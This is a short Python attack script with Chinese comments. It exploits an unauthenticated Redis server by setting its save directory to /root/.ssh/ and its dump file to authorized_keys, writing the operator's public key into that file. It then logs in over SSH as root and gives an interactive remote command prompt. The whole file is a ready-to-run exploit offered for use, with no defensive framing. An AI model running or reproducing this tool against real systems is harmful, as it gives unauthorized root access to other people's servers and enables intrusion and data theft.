# coding:utf-8
# redis交互式
# author:ske
# commands: python3 redis_shell ip

import redis
import sys
import paramiko

rsa_pub = '/root/.ssh/id_rsa.pub'   # 公钥路径
pkey = '/root/.ssh/id_rsa'          # 密钥路径

# 获取公钥内容
def get_id_rsa_pub():
    with open(rsa_pub, 'rt') as f:
        id_rsa_pub = '\n\n\n{}\n\n'.format(f.read())
    return id_rsa_pub

def shell_redis(ip):
    try:
        r = redis.Redis(host=ip, port=6379, socket_timeout=5)
        r.config_set('dir', '/root/.ssh/')
        print('[ok] : config set dir /root/.ssh/')
        r.config_set('dbfilename', 'authorized_keys')
        print('[ok] : config set dbfilename "authorized_keys"')
        id_rsa_pub = get_id_rsa_pub()
        r.set('crackit', id_rsa_pub)
        print('[ok] : set crackit')
        r.save()
        print('[ok] : save')
        key = paramiko.RSAKey.from_private_key_file(pkey)
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=22, username="root", pkey=key, timeout=5)
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('id')
        content = ssh_stdout.readlines()
        if content:
            print("[ok] connect to {} : {}".format(ip, content[0]))
        while True:
            command = input('{} >>> '.format(ip))
            ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
            contents = ssh_stdout.readlines()
            for content in contents:
                print(content)
    except Exception as e:
        error = e.args
        if error == ('', ):
            error = 'save error'
        print('[-] [{}] : {}'.format(error, ip))

if __name__ == '__main__':
    ip = sys.argv[1]
    shell_redis(ip)